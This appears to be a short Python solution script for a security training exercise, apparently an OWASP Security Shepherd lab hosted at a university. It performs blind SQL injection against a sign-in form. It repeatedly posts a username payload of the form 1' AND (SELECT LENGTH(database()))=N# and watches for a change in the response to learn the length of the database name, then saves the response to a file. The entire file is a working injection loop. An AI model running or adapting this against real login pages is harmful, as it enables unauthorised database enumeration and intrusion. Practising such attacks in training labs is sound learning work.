import requests

targetUrl = "http://shepherd.ii.uib.no:8002/signIn"

cont = 1
out = "{\"info\": \"no feedback for you this time!\"}"  


while True:
    param = {"inputName":"1' AND (SELECT LENGTH(database()))="+ str(cont) + "#", "inputPassword":"not_needed"}
    result = requests.post(targetUrl, param)
    print(cont)
    cont+=1
    if result.text != out:
        break


f = open("out_2.txt", "w")

f.write(result.text)
